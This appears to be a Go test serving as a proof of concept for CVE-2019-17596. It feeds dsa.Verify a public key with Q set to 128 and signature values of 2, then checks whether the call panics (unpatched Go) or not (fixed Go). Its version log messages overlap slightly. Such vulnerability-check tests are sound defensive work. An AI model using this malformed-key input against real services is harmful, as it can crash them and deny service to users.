package poc_dsa_verify_CVE_2019_17596

import (
	"github.com/stretchr/testify/require"

	"crypto/dsa"
	"crypto/rand"
	"testing"
)

func TestDSAVerify(t *testing.T) {
	priv := examplePrivateKey()

	hashed := []byte("testing")
	r, s, err := dsa.Sign(rand.Reader, priv, hashed)
	require.NoError(t, err)

	require.True(t, dsa.Verify(&priv.PublicKey, hashed, r, s))

	r.SetInt64(2)
	s.SetInt64(2)
	priv.PublicKey.Q.SetInt64(128)

	tf := func() {
		require.False(t, dsa.Verify(&priv.PublicKey, hashed, r, s))
	}

	if isFixed(t) {
		t.Log("Using Go >= 1.13.2 -- dsa.Verify should work")
		require.NotPanics(t, tf)
	} else {
		t.Log("Using Go <= 1.13.2 -- dsa.Verify will fail (test should pass)")
		require.Panics(t, tf)
	}
}
